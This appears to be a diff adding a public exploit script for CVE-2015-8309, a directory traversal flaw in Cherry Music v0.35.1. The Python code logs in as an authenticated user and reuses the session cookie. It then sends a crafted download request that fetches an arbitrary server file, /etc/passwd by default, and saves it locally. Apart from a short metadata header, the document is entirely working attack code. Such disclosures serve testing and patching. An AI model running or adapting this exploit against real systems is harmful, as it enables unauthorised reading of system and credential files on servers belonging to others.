@@ -1,0 +1,36 @@
+# Exploit Title: Cherry Music v0.35.1 directory traversal vulnerability allows authenticated users to download arbitrary files
+# Date: 11-09-2016
+# Exploit Author: feedersec
+# Contact: feedersec@gmail.com
+# Vendor Homepage: http://www.fomori.org/cherrymusic/index.html
+# Software Link: http://www.fomori.org/cherrymusic/versions/cherrymusic-0.35.1.tar.gz
+# Version: 0.35.1
+# Tested on: ubuntu 14.04 LTS
+# CVE : CVE-2015-8309
+
+import urllib2, cookielib, urllib
+
+#set parameters here
+username = 'admin'
+password = 'Password01'
+baseUrl = 'http://localhost:8080/'
+targetFile = '/etc/passwd'
+downloadFileName = 'result.zip'
+####
+
+cj = cookielib.CookieJar()
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj)) 
+params = urllib.urlencode({'username': username, 'password': password, 'login': 'login'})
+req = urllib2.Request(baseUrl, params)
+response = opener.open(req) 
+for c in cj:
+  if c.name == "session_id":
+    session_id = c.value
+
+opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
+opener.addheaders.append(('Cookie', 'session_id=' + session_id))
+params = urllib.urlencode({'value': '["' + targetFile + '"]'})
+request = urllib2.Request(baseUrl + "download", params)
+response = opener.open(request).read()
+with open(downloadFileName, 'wb') as zipFile:
+    zipFile.write(response)
